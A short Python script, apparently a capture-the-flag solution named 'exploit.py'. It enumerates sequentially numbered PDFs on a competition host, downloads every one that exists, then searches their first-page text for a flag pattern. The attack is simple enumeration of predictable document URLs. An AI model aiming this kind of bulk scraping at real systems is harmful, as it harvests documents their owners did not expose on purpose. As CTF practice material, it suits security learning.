#!/usr/bin/env python3
import os
import re
import sys

import PyPDF2 as pdf
import requests as req
from pdfminer.converter import PDFPageAggregator
from pdfminer.layout import LAParams, LTFigure, LTTextBox
from pdfminer.pdfdocument import PDFDocument
from pdfminer.pdfinterp import PDFPageInterpreter, PDFResourceManager
from pdfminer.pdfpage import PDFPage, PDFTextExtractionNotAllowed
from pdfminer.pdfparser import PDFParser

if len(sys.argv) == 1:
	print(
		"Usage: python3 exploit.py -[<OPTION>] (-d = download, -s = search flag)")
else:
	flag = sys.argv[1]

	if flag == "-d":
		print("[+] Downloading files...\n")
		file_count = 0
		for number in range(300):
			res = req.get(
				"http://hackfest.redrocket.club:31000/docs/document_{:03d}.pdf".format(number))
			if res.status_code == 200:
				file_count += 1
				print('\tDownloading document_{:03d}.pdf'.format(number))
				open(
					'./hacked_files/document_{:03d}.pdf'.format(number), 'wb').write(res.content)
		print("\n[i] " + str(file_count) + " files downloaded")

	elif flag == "-s":
		# Searching for flag
		print("[i] Searching for flag...")
		os.chdir("./hacked_files/")

		files = os.listdir()
		files.remove(".DS_Store")

		for file in files:

			text = ""

			with open(file, 'rb') as f:
				parser = PDFParser(f)
				doc = PDFDocument(parser)
				page = list(PDFPage.create_pages(doc))[0]
				rsrcmgr = PDFResourceManager()
				device = PDFPageAggregator(rsrcmgr, laparams=LAParams())
				interpreter = PDFPageInterpreter(rsrcmgr, device)
				interpreter.process_page(page)
				layout = device.get_result()
				for obj in layout:
					if isinstance(obj, LTTextBox):
						text += obj.get_text()

				text = text.replace("\n", " ")  	# remove alls newline-characters

				chunks = text.split(" ")        	# split string into spaceless chunks

				for chunk in chunks:            	# search if chunk contains flag-like pattern
					if re.search(r"{.+}", chunk):
						print(chunk)
						exit()

		print("[!] Error 404 - flag not found")
